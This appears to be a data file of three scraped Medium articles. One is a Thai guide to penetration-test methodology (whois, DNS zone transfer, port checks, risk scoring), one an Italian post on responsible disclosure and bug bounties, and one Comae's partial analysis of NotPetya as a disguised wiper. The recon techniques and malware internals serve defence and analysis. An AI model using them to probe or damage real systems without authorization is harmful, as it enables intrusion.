1.1 สำรวจ : ตรวจหาเครือข่ายเป้าหมายในการปฏิบัติงาน เช่นบริษัท XYZ ต้องการให้ทำ Penetration test เพื่อดูว่าเครือข่ายองค์กรบริษัทมีช่องทางใดที่เป็นช่องโหว่และมีโอกาสที่ถูกโจมตีจากภายนอกได้- การค้นหาข้อมูลบริษัท XYZ กับช่องทางการเชื่อมต่ออินเตอร์เน็ต โดยใช้เครื่องสาธารณะ และซอฟต์แวร์ในการค้นหาข้อมูล ซึ่งประกอบด้วย การค้นหาช่องทางสาธารณะได้แก่การ whois ชื่อ Domain name บริษัท XYZ ที่ทำการเปิดข้อมูลในสาธารณะเช่น เว็บไซต์ บริษัท อีเมลล์บริษัท เป็นต้น สิ่งที่ได้ตรงนี้คือเราจะทราบถึง รายชื่อผู้จดทะเบียนชื่อเว็บไซต์รของบริษัท ที่อยู่ เบอร์โทรศัพท์ที่ใช้ในการติดต่อ วันหมดอายุของ domain เว็บไซต์บริษัทนั้นได้ วิธีอาจจะไม่ได้รับข้อมูลทั้งหมดเนื่องจากสมัยนี้ได้มีการปิดข้อมูลชื่อผู้จดทะเบียนเว็บไซต์ และข้อมูลอีเมลล์ในการติดต่อได้ผลลัพธ์ที่ได้จากการค้นหาข้อมูลสาธารณะนั้น คือ รายชื่ออีเมลล์ของผู้จดทะเบียนเว็บไซต์ ซึ่งปกติหากมีการจดทะเบียนควรตั้งชื่อเป็น pool e-mail ไม่ควรใช้ชื่อใครคนใดคนหนึ่งในองค์กรเป็นคนจดทะเบียนเว็บไซต์ ก็เพื่อว่าหากมีการโยกย้ายงาน หรือคนที่จดทะเบียนนั้นไม่อยู่ในบริษัทแล้วก็จะทำให้การอัพเดทข้อมูลในการจดทะเบียนเว็บไซต์เป็นไปอย่างยากลำบากขึ้น อีกทั้งหากเป็นชื่อ domain name ของเว็บไซต์ที่มีความสำคัญบุคคลที่จดทะเบียนเว็บไซต์ก็อาจจะมีความเสี่ยงที่นักโจมตีระบบจะใช้ช่องทาง e-mail เป็นการปลอมตัวเพื่อเข้าไปเป็นผู้จดทะเบียนเว็บไซต์ได้จากวิธีการเดา password หรือส่ง Trojan ไปที่ e-mail บุคคลนั้นเพื่อได้มาซึ่ง domain name ที่ได้ลงทะเบียนไว้ ถือว่าเป็นการยึด domain nameได้เช่นกัน ในปัจจุบันก็พบกันบ่อยๆว่ามีการยึด domain name เป็นตัวประกันเช่นกัน ในการค้นหาข้อมูลบริษัท XYZ ยังสามารถใช้เครื่องมือในการเรียกใช้บริการ DNS ที่ผู้จดทะเบียนเว็บไซต์นั้นได้เช่น DNS เชื่อมโยงไปยังที่ใด ฝากไว้กับ ISP หรือตั้ง DNS Server เอง ซึ่งส่วนนี้จะสามารถค้นหาช่องโหว่ที่เกี่ยวข้องกับการใช้บริการ DNS Server ได้โดยตรวจสอบหา Zone Transfer เพื่อดูความสัมพันธ์อื่นจากชื่อ domain อื่นที่พบ เช่น www.xyz.com พบว่ามี DNS ที่เกี่ยวข้องคือ mail.xyz.com , ns1.xyz.com , ns2.xyz.com เป็นต้นก็จะทำให้เครื่องเป้าหมายที่เราจะทำการ Penetration test เพิ่มช่องทางการเข้าถึงได้ถึง 3 เครื่องจากในตัวอย่างนี้ที่กล่าวไป ซึ่งสมัยใหม่นี้ใช้เครื่องมือพวก Open source intelligence (OSINT) ส่วนข้อมูลสาธารณะ ใช้พวก Internet census ก็จะรวบรวมข้อมูลได้มากขึ้น
ในการใช้ข้อมูลสาธารณะนั้นยังมีอีกมากมาย เช่นตรวจสอบสถานะ Link ของเว็บไซต์ เพื่อดูความสัมพันธ์ของข้อมูล , ตรวจสอบหา e-mail ของ domain จากเครื่องมือค้นหา (search engine) เพื่อดูพฤติกรรมการใช้ข้อมูลองค์กร ในกรณีก็ค้นหาคำว่า @xzy.com เพื่อว่าจะเข้าถึงระบบจาก e-mail พนักงานในองค์กรได้อีกทาง ซึ่งหากทำ Penetration test ควรจะแจ้งให้บริษัทรับทราบถึงวิธีการดังกล่าวด้วย ไม่เช่นนั้นอาจผิดตามกฏหมายคอมพิวเตอร์ฯได้เช่นกันหากมีการตรวจสอบพบ
- สำรวจช่องทางการเข้าถึงเครือข่ายองค์กร โดยวิธีการนี้ต่อยอดจากการแบบแรก ซึ่งเน้นไปทางการค้นหาเส้นทางการเดินทางของข้อมูล (Route) ของบริษัท Xyz เพื่อออกสู่อินเตอร์เน็ตภายนอก หากพบว่าช่วง IP Address ที่เป็น Public IP ของบริษัทนั้นที่ค่ามาจาก ISP ก็จะทำให้มีช่องทางการเข้าถึงมากขึ้นจากเดิม ซึ่งจะทำให้นักโจมตีระบบสามารถใช้เทคนิคการตรวจสอบได้มากขึ้นเช่นการทำ DDoS/DoS กับช่วง IP ที่บริษัทได้รับมาเป็นต้น
สรุปได้ว่าในขั้นตอน สำรวจ นั้นจะต้องหาข้อมูลเกี่ยวข้องกับบริษัทที่ให้ประเมินความเสี่ยงมากที่สุด เพื่อหาช่องทางในการเข้าถึงระบบได้หลากหลายช่องทางขึ้น
1.2 ตรวจสอบ : เมื่อเราทำการรวบรวมข้อมูลที่ได้มาจากขั้นตอนสำรวจนั้น ก็จะทำการวาดรูปความสัมพันธ์เครือข่ายองค์กรออกมาพร้อมกำหนดจุดที่ทำการตรวจสอบขึ้น การตรวจสอบมักจะใช้ check list ตามมาตราฐาน หรือใช้เครื่องมือในการตรวจสอบ ในกรณีนี้เป็นการทำ Penetration test จากภายนอก สิ่งที่ตรวจสอบได้แก่- Information leak จากขั้นตอนที่หนึ่ง เช่น รายชื่อผู้จดทะเบียนเว็บไซต์, e-mail, รายชื่อ DNS ที่มีความสัมพันธ์กับบริษัท, ข้อมูลรั่วจากการใช้งานอินเตอร์เน็ตได้แก่ e-mail พนักงานในการโพสข้อมูล, Link ของเว็บไซต์บริษัทที่ทำให้ได้ข้อมูลอื่นๆเป็นต้น- Web Application checklist ตรวจสอบช่องโหว่ที่พบจากเว็บไซต์ในกรณีคือ www.xyz.com ว่ามีช่องโหว่ในการเข้าถึงระบบผ่าน Web application จากมาตราฐาน OWASP เป็นต้น รายละเอียดการตรวจสอบเบื้องต้นสามารถอ่านได้ที่ http://nontawattalk.blogspot.com/2009/09/layer-7-3.html
- DNS server checklist ตรวจสอบค่า Domain name server ที่แสดงข้อมูลสาธารณะ- E-mail Server checklist ตรวจสอบค่าการใช้งาน E-mail server ที่แสดงข้อมูลสาธารณะ เช่นกรณีที่ บริษัท XYZ จัดทำ Mail server เองขึ้นการตรวจสอบจะตรวจว่า Mail server ของบริษัทนั้นจะมีโอกาสจดหมายขยะจะเข้าถึงได้หรือไม่เป็นต้น- Network Topology checklist ตรวจสอบการเชื่อมต่ออินเตอร์เน็ตบริษัท เส้นทางการ route ข้อมูลจำนวน Linkของ ISP ที่บริษัท xyz ใช้บริการ ซึ่งส่วนนี้จะเน้นไปการทดสอบ DDoS/DoS ว่าทางบริษัท xyz มีการควบคุมการโจมตีชนิดนี้ได้หรือไม่ ซึ่งจะสะท้อนให้เห็นถึงความพร้อมโครงสร้างเครือข่าย (Network) ของบริษัทว่าได้มีการจัดเตรียมเทคโนโลยีด้านความมั่นคงปลอดภัยครบถ้วนในส่วน Perimeter network เช่นได้มีการจัดทำ ACL (Access Control List) ค่า Blacklist ในอุปกรณ์ Router หรือ Firewall , มีอุปกรณ์ Firewall ที่ป้องกันทางเครือข่ายในระดับ stateful inspection หรือไม่ เป็นต้น- ตรวจสอบ Port services จากข้อมูลในขั้นตอนสำรวจ เช่น เราพบ IP Address ของเว็บไซต์บริษัท , e-mail , DNS server, Router ก็ทำการตรวจสอบว่ามี Port services อะไรที่ทำการเปิดไว้เพื่อจะทำการขยายผลต่อในขั้นตอนต่อไป
1.3 วิเคราะห์ : เมื่อทำการตรวจสอบจากการสำรวจและตรวจสอบ ภายนอกเครือข่ายองค์กรแล้วนำข้อมูลเหล่านั้นมาทำการวิเคราะห์เพื่อศึกษาว่าพบช่องโหว่และการเข้าถึงข้อมูล เช่น จากการตรวจสอบ Port services พบว่ามีการเปิด Port ที่มีช่องโหว่และสามารถเข้าถึงระบบจากภายนอกได้ ผ่านการให้บริการ Web server port 80 ช่องโหว่ที่พบคือ มีการใช้ Web server version เก่าและมี tools ในการเข้าถึงระบบ (Exploit) ผ่านช่องโหว่นี้ได้ หรือ ใน Web server เปิด port 1433 เป็นการเปิด port SQL server เป็น Data base บนเครื่อง Web server และมี exploit ที่เข้าถึงระบบได้ เป็นต้นในขั้นตอนวิเคราะห์จะลงรายละเอียดถึงการเข้าถึงระบบจากภายนอก เป็นส่วนๆจากขั้นตอนสำรวจและตรวจสอบ เช่น ส่วนของ Web server , ส่วนของ E-mail Server , ส่วนของ DNS server และส่วนของ Router เป็นต้น
1.4 ประเมิน : ในส่วนนี้ผมขอเรียกว่า Vulnerability Assessment เมื่อทำการวิเคราะห์ถึงช่องโหว่ที่พบแล้ว ถึงขั้นตอนสุดท้ายคือการประเมิน ว่าช่องโหว่ที่พบนั้นมีความเสี่ยงและมีผลกระทบต่อธุรกิจองค์กรอย่างไรส่วนใหญ่เป็นเอกสารการแนะนำและการปิดช่องโหว่ที่พบสูตรการหาค่าความเสี่ยงต่อธุรกิจองค์กร Risk = Vulnerability x Threat หรือบ้างครั้งอาจจะเห็นเป็นสูตรRisk = Vulnerability x Threat x cost การประเมินความเสี่ยง (Risk Assessment) สามารถมองได้ 2 แบบคือด้านมหาภาคภาพรวมองค์กร ที่ต้องดูถึง 3P คือVulnerability คน กระบวนการ และเทคโนโลยีThreat จากคน กระบวนการและเทคโนโลยีและ จุลภาคคือทางด้านเทคนิคอย่างเดียว คือมอง Vulnerability และ Threat เฉพาะทางเทคโนโลยีและทั้งหมดผมขออธิบายก็เป็นเฉพาะส่วนของเทคนิคอย่างเดียว ยังไม่มองแบบครบ 3Pคือการประเมินหาความเสี่ยงจากค่าความเสี่ยง (Risk)ที่พบ จะเกิดจาก ช่องโหว่ที่พบ (Vulnerability) คูณกับค่าภัยคุกคาม (Threat) ลักษณะภัยคุกคามที่พบก็มีความเสี่ยงสูง กลาง และต่ำ ซึ่งส่วนนี้ขึ้นอยู่รูปแบบผู้ทำเอกสารว่าจะจัดทำค่าการประเมินความเสี่ยงจากอุปกรณ์หรือเครื่องมือในตรวจวิเคราะห์ (Tools) มาสรุปความเสี่ยง สูง กลาง และต่ำ ก็ได้
และจัดทำค่าดัชนีชี้วัดความเสี่ยงที่มีผลกระทบต่อธุรกิจทางด้านเทคนิค ซึ่งเอกสารในผลลัพธ์ของแต่ละบริษัทที่จัดทำอาจจะมีรูปแบบที่แตกต่างกันได้เช่นกัน
ในตอนหน้าเรามาพูดถึงการทำ Penetration test และ Vulnerability Assessment ภายในองค์กรกันต่อไปครับ
การทำ Penetration test นั้นมีความสำคัญกับการที่จะประเมินหาช่องโหว่ที่เกิดขึ้นจากการใช้งานไอซีที ของบริษัทแล้วนั้น ตอนนี้มาทำความเข้าใจมากขึ้นอีกชนิดหนึ่งของการทำ Penetration test นั้นคือการทำ Penetration test ภายในองค์กร หรือจะเรียกว่า white box ก็ได้ ซึ่งการทำงานประเภทนี้ต้องได้รับความร่วมมือกับผู้ดูแลระบบของฝั่งผู้ใช้บริการ ตั้งแต่การให้แผนผังระบบเครือข่าย จำนวน IP Address ตลอดถึงรายละเอียดประเภทอุปกรณ์เครือข่ายที่เกี่ยวข้อง เป็นต้น เริ่มกันถึงตอนที่ 2 ต่อเนื่องเลยแล้วกันครับ
2. การทำ Penetration test ภายในองค์กรเชิงลึกเป้าหมายในการทำ Penetration test ภายในคือการทดสอบหาช่องโหว่ที่พบจากการใช้งานไอซีทีในองค์กรเพื่อประเมินช่องโหว่และทำการปิดกั้นช่องโหว่ที่ค้นพบขึ้นเพื่อไม่เกิดปัญหาขึ้นในระยะยาว
มีขั้นตอนการทำงานดังนี้
2.1 สำรวจ : สำรวจผังโครงสร้างงานได้ไอซีทีขององค์กร, แผนผังระบบเครือข่าย, ประเภทอุปกรณ์ประกอบด้วย- Network Device ได้แก่ จำนวนอุปกรณ์ Router , อุปกรณ์ Switch, อุปกรณ์ Firewall, Network Load balacing, Network VPN, Bandwidth management, อุปกรณ์ Network IDS/IPSซึ่งต้องบอกตำแหน่ง (Perimeter zone , DMZ zone) และค่า IP Address เป็นต้น- เครื่องแม่ข่าย (Server) ได้แก่ Web Server, Mail Server , DNS Server ภายใน, Proxy Server, Authentication Server, ERP Server ซึ่งต้องบอกตำแหน่ง (DMZ zone) และค่า IP Address เป็นต้น- เครื่องลูกข่าย (Client) ได้แก่ ระบบปฏิบัติการที่ใช้งานได้แก่ Window XP , Linux อื่นๆ ต้องบอกตำแหน่ง (VLAN) และค่า IP Address เป็นต้น
2.2 ตรวจสอบ : ตรวจสอบตามมาตราฐาน Security Checklist ดังนี้ตรวจสอบความมั่นคงปลอดภัยตามมาตราฐานของ อุปกรณ์ Network Devices ได้แก่ Security Checklist Router , Firewall , IDS/IPS เป็นต้นตรวจสอบความมั่นคงปลอดภัยตามมมาตราฐานของ เครื่องแม่ข่าย (Server) ได้แก่ Security Checklist Windwos 2000 server , 2003 server , Linux Server เป็นต้นตรวจสอบความมั่นคงปลอดภัยตามมาตราฐานของ เครื่องลูกข่าย (Client) ได้แก่ Security Checklist การใช้งานเครื่องคอมพิวเตอร์ในองค์กรตามมาตราฐาน ISO27001 เป็นต้น
ซึ่งในส่วน security checklist นั้นทางผู้ปฏิบัติงานสามารถนำข้อมูลจาก NIST , NSA หรือ Thaicert ในเอกสารตรวจสอบในแต่ละส่วนได้
2.3 วิเคราะห์ : การวิเคราะห์ช่องโหว่ที่พบจากการสำรวจและตรวจสอบในการวิเคราะห์นี้สามารถใช้อุปกรณ์ หรือ เครื่องมือในการประเมินความเสี่ยงเพื่อตรวจหาความผิดปกติและช่องโหว่ที่พบตามอุปกรณ์เครือข่าย (Network Devices) และเครื่องแม่ข่าย (Server) ที่สำคัญได้การใช้เครื่องมือในการประเมินความเสี่ยง สิ่งที่ควรตรวจสอบให้มากขึ้นได้แก่
* การวิเคราะห์ในระดับเครือข่ายคอมพิวเตอร์ (Network Analysis)- ปริมาณการใช้งาน Bandwidth ของระบบเครือข่าย ทั้งข้อมูลขาเข้าและขาออก- ปริมาณ Throughput ของระบบเครือข่ายทั้งขาเข้าและขาออก แยกตาม Application Protocol ที่สำคัญด้วยเนื่องจากจะช่วยตรวจสอบถึงการใช้งานอันไม่พึ่งประสงค์ของ User ในองค์กร ว่ามีการแพร่ระบาดไวรัสคอมพิวเตอร์ , เครื่อง User เป็น Botnet , การส่งข้อมูลขยะ (spam) หรือมีพฤติกรรมที่ผิดต่อนโยบายบริษัทหรือไม่อีกด้วย ซึ่งในส่วนนี้เราจะสามารถนำไปวิเคราะห์เป็นค่าภัยคุกคามในองค์กร ที่ใช้ประกอบกับขั้นตอนสุดท้ายคือการประเมินได้ต่อไป
** การวิเคราะห์ในระดับอุปกรณ์เครือข่ายและเครื่องแม่ข่ายที่สำคัญ- ทำการใช้เครื่องมือประเมินความเสี่ยงเพื่อตรวจดู Port Services ที่อุปกรณ์เครือข่าย และ เครื่องแม่ข่ายที่สำคัญเปิดอยู่- วิเคราะห์ช่องโหว่จากการใช้เครื่องมือหลังจากตรวจ Port Services แล้วจะพบว่า Services ที่ทำการใช้งานอยู่บนอุปกรณ์เครือข่ายและเครื่องแม่ข่ายที่สำคัญ นั้นมีการเปิดใช้งานอยู่ นั้นมีความช่องโหว่ที่เป็นภัยรุนแรงหรือไม่ เช่น เปิด Port services 80 TCP เป็น Application Protocol ของ HTTP ซึ่งในนี้ประกอบด้วย Web Server ที่ใช้งานอยู่ที่เป็น IIS , Apache , หรืออื่นๆ ซึ่งหากเป็น Version ที่มีช่องโหว่ หรือมี code exploit ที่สามารถส่ง command หรือ script จากทางไกลและสามารถยึดครองเครื่องนั้นได้ก็จะถือว่าเป็นระดับภัยคุกคามที่รุนแรง เป็นต้น- วิเคราะห์หา Security Patch ที่อัพเดทล่าสุดเพื่อเสริมสร้างความมั่นคงปลอดภัยให้กับอุปกรณ์เครือข่าย และ แม่ข่ายที่สำคัญ โดยทั้งนี้ควรทำการเตรียมแผนทดสอบถึงผลกระทบก่อนการอัพเดท Security Patch ก่อน
4. ประเมิน : ขั้นตอนนี้จะเป็นการสรุปผลความเสี่ยงที่พบจากขั้นตอนที่ผ่านมา โดยทำเป็นค่าดัชนีชี้วัดความเสี่ยง และผลการปฏิบัติงาน รวมถึงแนวทางในการปิดกั้นส่วนที่เป็นช่องโหว่ (Hardening) และป้องกันในระยะยาว ซึ่งในส่วนนี้จะเน้นไปทางการทำรายงานผล ในรูปแบบเอกสารขยายความค่าดัชนีชี้วัดความเสี่ยงเกิดจาก Risk = Vulnerability x Threatค่าความเสี่ยงที่ประเมินได้ ขึ้นอยู่กับนโยบายขององค์กรด้วย หาดูแล้วไม่กระทบกับธุรกิจมากค่าความเสี่ยงนั้นก็จะแปรผันไปกับการประเมินความเสี่ยงของผู้ปฏิบัติงาน (Penetration tester) ซึ่งในแต่ละที่อาจมีค่าการประเมินไม่เหมือนกันเช่น ในกรณีที่พบว่า พบช่องโหว่ Web Server ที่ระบบ IIS 6.0 ที่ยังไม่ได้อัพเดท Patch security เมื่อประเมินแล้วว่า Web Server นั้นไม่สามารถเข้าถึงได้จากอินเตอร์เน็ต และเป็นเครื่องเฉพาะในแผนกใดแผนกหนึ่งดังนั้นระดับความสำคัญที่เป็นภัยคุกคามที่รุนแรงก็จะน้อยกว่าเครื่อง Web Server ที่เผยแพร่ข้อมูลสาธารณะ (Public IP) ได้เป็นต้น ซึ่งค่าดัชนีชี้วัดส่วนนี้ขึ้นกับผู้ปฏิบัติงานในการทำ Penetration Test และประสบการณ์ รวมถึงความเขี่ยวชาญของบุคคลนั้นในการประเมิน บางครั้งการให้บริษัทต่างที่กันมาประเมินหาความเสี่ยง ก็อาจมีค่ารายงานผลไม่เท่ากันเสมอไป ขึ้นอยู่กับทีมปฏิบัติงาน ซึ่งหากในทีมมี Certification ด้าน Security แทบไม่มีผลหากผู้ปฏิบัติงานหากขาดประสบการณ์ในส่วนการวิเคราะห์และประเมินค่าความเสี่ยงนี้ได้
สรุปได้ว่าค่า Vulnerability (ช่องโหว่ที่ค้นพบ จาก อุปกรณ์เครือข่ายที่สำคัญ และเครื่องแม่ข่ายที่สำคัญ) จะมีระดับความเสี่ยง สูง กลาง และต่ำ หรืออาจจะมีรายละเอียดมากกว่านั้นค่า Threat (ภัยคุกคาม) ขึ้นกับนโยบายองค์กร และการประเมินค่าจะผู้ปฏิบัติงาน นำมารวมค่ากันแล้วจะได้เป็นดัชนีชี้วัดความเสี่ยงได้ ซึ่งการประเมินส่วนนี้ก็เป็นเทคนิคลับของแต่ละบริษัทที่ใช้ในการประเมินและสามารถวัดผลได้จริงในทางปฏิบัติ
มาถึงตรงนี้บอกได้ว่าการประเมินความเสี่ยงนั้นไม่สามารถที่สิ้นสุดการทำงานได้จากการใช้เครื่องมือ (tools) มาแล้วจะสรุปค่าความเสี่ยงที่เกิดขึ้นจากการใช้งานไอซีทีองค์กรได้จำเป็นต้องอาศัยคนวิเคราะห์ถึงระดับภัยคุกคามและผลลัพธ์รายงานที่มีประโยชน์ต่อบริษัทเพื่อใช้ในการปรับปรุงแก้ไขให้ระบบมีความแข็งแรงและมีความปลอดภัยขึ้น
ดังเดิมเขียนที่ http://nontawattalk.sran.org/2009/10/penetration-test-1.html
นนทวัตต์ สาระมานNontawatt Saraman05/10/2552
Written by
","['Penetration Testing', 'Vulnerability Management', 'Cybersecurity']"
Perché la sicurezza informatica non è una questione di bianco e nero,https://medium.com/team-per-la-trasformazione-digitale/sicurezza-informatica-policy-responsible-disclosure-hacker-etici-52a174d44c49?source=tag_archive---------9-----------------------,"di Giovanni Bajo e Gianluca Varisco
This post is available also in English
Partiamo con questo post da un tema non facile da trattare, ma che è anche quello che ci sta più a cuore di tutti e che si è guadagnato il primo posto nel nostro manifesto (e se non l’avete ancora letto, potete ripescarlo nel primo post di Diego Piacentini sul Team per la Trasformazione Digitale):
Sicurezza e privacy sono i principi più importanti; mai, per nessuna ragione, scenderemo a compromessi
Ma tanto per iniziare, che cosa si intende per sicurezza nel mondo dei siti o dei software?
Negli ultimi anni, sentiamo spesso parlare di account rubati, password rivelate, carte di credito a rischio. Non esiste software che si possa considerare “sicuro”.
La sicurezza non riguarda dicotomie, non si misura in bianco e nero, ma si rivaluta sempre in ogni istante: un software che si considera sicuro oggi, potrebbe rivelarsi improvvisamente inadeguato, nel caso in cui qualcuno vi trovasse una vulnerabilità. Per questo esistono solo livelli di sicurezza, e quello di un software dipende da molteplici fattori come la tipologia dell’attaccante o il budget a sua disposizione.
Proviamo a pensare al software come una casa da proteggere. Un sistema di sicurezza potrebbe essere quello di utilizzare una porta blindata per difenderla e, certo, magari risulterebbe sicura contro un ladro armato di grimaldello. Ma che cosa potrebbe succedere contro un ladro munito di strumenti sofisticati o che possa addirittura entrare in casa vostra dalla finestra?
Identificare e risolvere problemi di sicurezza in qualunque software è dunque una pratica ordinaria e comune. In maniera più o meno consapevole, quando installate gli aggiornamenti del vostro browser o del vostro smartphone state risolvendo uno o più problemi di sicurezza. Questi aggiornamenti sono essenziali per rendere i nostri software resilienti ad attacchi informatici, senza i quali un attaccante potrebbe accedere ad importanti dati personali come password, email, SMS.
È per questo che le aziende stesse, sempre più spesso, rendono pubblici i dettagli relativi ai bug di sicurezza che vengono risolti in ogni successivo rilascio dei propri prodotti. Queste aziende non solo non nascondono tali bug, ma ne incentivano una “disclosure” responsabile da parte delle comunità dei cosiddetti “ethical hacker” (hacker “buoni”, white hat hacker, hacker etici). Quando questi programmi sono a pagamento, sono noti come “bug bounty”, e incentivano gli ethical hacker a inviare in modo privato le loro segnalazioni sui bug di sicurezza identificati in un software.
È come se la vostra banca offrisse un premio a chiunque riesca a intrufolarsi nel caveau, ma senza rubare nulla e raccontando poi come ci è riuscito.
È molto meglio, e sicuramente conveniente, premiare un ethical hacker per il suo lavoro, migliorando la sicurezza del proprio software, piuttosto che infilare la testa sotto la sabbia e aspettare che “black hat hacker” (gli hacker “cattivi”) scoprano gli stessi problemi e li usino indebitamente per arrecare danno.
Qualche settimana fa un ethical hacker diciottenne, Luca Milano, ha segnalato alcuni importanti problemi di sicurezza presenti in 18app, il software che gestisce il bonus cultura di 500 euro assegnato ai nati nel 1998. Luca è stato rigoroso, corretto e professionale; seguendo tutte le buone pratiche di cui parlavamo, prima di pubblicare la notizia ha segnalato le vulnerabilità tramite responsible disclosure, inviandone cioè comunicazione al CERT competente, l’organizzazione incaricata di raccogliere le segnalazioni di incidenti informatici e potenziali vulnerabilità nei software provenienti dalla comunità degli utenti.
Sogei, la società del Ministero dell’Economia che ha sviluppato 18app, ha risolto in poche ore il problema e messo online una versione corretta. Non possiamo che fare i complimenti al CERT Nazionale, al CERT-PA, e a Sogei per avere agito così tempestivamente e con tanta efficienza, nonché ringraziare Luca per il lavoro svolto. Per avere maggiori dettagli, potete leggere l’articolo sul suo blog tecnico, pubblicato dopo la risoluzione dei problemi.
La scorsa primavera, il Dipartimento della Difesa americano ha lanciato un esperimento chiamato “Hack the Pentagon”: un vero bug bounty su alcuni siti governativi, della durata di circa 30 giorni, durante i quali 1.400 hacker hanno inviato numerose segnalazioni, aiutando a risolvere ben 138 diversi problemi di sicurezza, per un totale di 75.000 dollari pagati in ricompense. Si pensi a quanto più sicuri oggi sono questi siti e di conseguenza i cittadini americani che li utilizzano, con un budget tutto sommato modesto per la pubblica amministrazione in questione.
Oltre al beneficio concreto ottenuto, il programma è servito anche a confermare la tesi che esistesse una comunità di hacker etici disposti a collaborare con il governo per migliorare la sicurezza della nazione. Citiamo qui di seguito due dichiarazioni di esponenti governativi americani, rilasciate al termine del programma.
Sapevamo già che personaggi incaricati da governi stranieri e hacker “cattivi” volessero attaccare e violare le nostre reti. Quello che non avevamo realizzato appieno prima di questo esperimento era quanto fossero numerosi gli hacker “buoni” che vogliono fare la differenza, aiutando a rendere i nostri cittadini e la nostra nazione più sicuri.
Ashton B. Carter – Segretario alla Difesa, USA
Ciò che l’iniziativa “Hack the Pentagon” ha confermato è che esiste un gran numero di tecnici e innovatori che vogliono contribuire alla sicurezza della nazione, ma il quadro giuridico odierno impedisce loro di farlo.
Eric Fanning – Segretario dell’Esercito, USA
Apprendiamo, inoltre, con piacere che il Parlamento Europeo ha appena varato e finanziato (il 1° Dicembre scorso) un programma per migliorare la cybersecurity.
Come Team Digitale, crediamo fermamente nella responsible disclosure come strumento principe per comunicare con la comunità di ethical hacker italiana e internazionale, perché la posta in palio è la privacy e la sicurezza di tutti noi e dei nostri dati personali. Riteniamo anche che sia giusto ricompensare chi, identificando un problema, lo comunica in modo tempestivo e privato, rimandandone la diffusione solo a quando il problema è stato risolto.
Un programma di responsible disclosure ha anche l’obiettivo di agevolare la rapida risoluzione dei problemi di sicurezza e minimizzare i rischi per la cittadinanza. La tempestività nel risolvere le falle risulta cruciale per ridurre la finestra temporale in cui i nostri software sono esposti agli attaccanti.
È per questo motivo che abbiamo intrapreso un percorso con il CERT Nazionale e il CERT-PA per definire e pubblicare una policy di responsible disclosure nazionale; stiamo contemporaneamente indagando lo scenario tecnico e normativo (inclusa la protezione legale di chi fa la disclosure) per verificare i presupposti per il lancio del programma. Valuteremo anche l’opportunità di sperimentare una forma di bug bounty.
Non tocca a noi riscrivere le leggi in materia, ma ci confronteremo con le istituzioni competenti per individuare il miglior assetto normativo possibile nell’interesse di tutti e con il Garante per la Privacy per essere certi che la privacy dei cittadini sia sempre protetta.
E non vogliamo farlo da soli: condivideremo le bozze di policy per poterne discutere con i soggetti interessati. Nel frattempo, se volete contattarci per parlare di questo tema, scrivete a questa email, oppure lasciateci i vostri contatti in questa form e vi contatteremo noi appena saremo pronti.
Ringraziamo tutti gli esperti di sicurezza, blogger e giornalisti tecnici che hanno, in modo costruttivo, suggerito soluzioni dai loro blog e dalle loro testate.
Continueremo ad aggiornarvi su questo canale.
Written by
","['English', 'Progetto IO', 'pagoPA', 'ANPR', 'Infrastrutture Digitali', 'Cybersecurity', 'Government', 'Software', 'Responsible Disclosure', 'Digital Transformation']"
Petya.2017 is a wiper not a ransomware - Comae Technologies,https://blog.comae.io/petya-2017-is-a-wiper-not-a-ransomware-9ea1d8961d3b?source=tag_archive---------0-----------------------,"Dubbed Fakesomware by Comae (Also called ExPetr, PetrWrap, NotPetya, DiskCoder).TL;DR: The ransomware was a lure for the media, this variant of Petya is a disguised wiper.
Update1: Few hours later, Kaspersky’s research led to a similar conclusion.
Update2: Added more info on the wiper command & comparative screenshots of the two keys that visually confirms Kaspersky’s finding and why the MBR copy routine didn’t make sense.
What’s the difference between a wiper and a ransomware ?
The goal of a wiper is to destroy and damage. The goal of a ransomware is to make money. Different intent. Different motive. Different narrative. A ransomware has the ability to restore its modification such as (restoring the MBR like in the 2016 Petya, or decrypting files if the victim pays) — a wiper would simply destroy and exclude possibilities of restoration.
Yesterday, we provided a preliminary analysis where we demonstrated that the 27th June 2017 version of Petya leveraged SMB exploits ETERNALBLUE and ETERNALROMANCE.
Today, we spent more time to understand how the files could be retrieved and how the actual MBR and MFT was being encoded.
Fortunately, there are multiple excellent existing analysis from 2016 Petya that have been published last year in multiple languages such as French, or English [1, 2]. Today, Microsoft published a very descriptive analysis of the 2017 Petya but for some reasons missed the below part.
After comparing both implementation, we noticed that the current implementation that massively infected multiple entities in Ukraine was in fact a wiper which just trashed the 18 first sector blocks of the disk while replicating itself. Some noted that this was mainly slack space as only the first sector is relevant for most of machines — except few exceptions. I mainly note that since this can be used in some scenarios, this is why I consider it a sloppy overwrite.
The first sector block is being reversibly encoded by XORed with the 0x7 key and saved later in the 34th block. But since it replaces it with a new bootloader (41f75e5f527a3307b246cadf344d2e07f50508cf75c9c2ef8dc3bae763d18ccf) of 0x22B1 bytes it basically sets v19 to 0x13 (19).
That would mean that 18 sector blocks following the first sector block are being purposely overwritten, they are not read or saved anywhere. Whereas the original 2016 Petya version correctly reads each sector block and reversibly encode them.
2016 Petya modifies the disk in a way where it can actually revert its changes. Whereas, 2017 Petya does permanent and irreversible damages to the disk.
On the left, we can see the current version of Petya clearly got rewritten to be a wiper and not a actual ransomware.
This means the MBR section of the disk is purposely over written by the new bootloader 41f75e5f527a3307b246cadf344d2e07f50508cf75c9c2ef8dc3bae763d18ccf.
Moreover, the payment email address isn’t accessible anymore if victims would happen to send payments.
After further analysis, (see Appendix A) we also discovered that the attackers implemented a function that wipes the first 10 sectors of `\\\\.\\PhysicalDrive0` including the MBR under two conditions:
The hash command generation, and flag gestion for the different modes can be found in our decompiled version here.
UPDATE: After further research, we determined that the mysterious hash command is generated from lower case “avp.exe” process name which correspond to the Kaspersky Anti-Virus.
As Kaspersky reported, the key generated itself on the screen is fake and randomly generated. After looking more at how the encryption file key was generated, we also notice an inconsistency that reinforces this statement. This can also be proven by comparing “installation key” displayed in the README.txt and on the screen — as you can see the format is clearly different.
On the left is the display by the MBR code we described above as sloppy written, on the right the content of the README.txt with an actual key generated by the ransomware.
This means that assuming a decryptor would come to be released, the input required would have to come through the README.txt — not from the screen.
As described by Ladislav Zezula, the boolean Final flag in the function CryptEncryptis incorrectly initialized during the encryption.
The Salsa20 key appears to have been modified with an hexadecimal editor and not recompiled. The new value is also set to the cryptic value “-1nvalid s3ct-id” which can be read as “invalid secret identifier”.
We believe the ransomware was in fact a lure to control the media narrative, especially after the WannaCry incidents to attract the attention on some mysterious hacker group rather than a national state attacker like we have seen in the past in cases that involved wipers such as Shamoon.
The attacker took an existing ransomware which he repackaged.
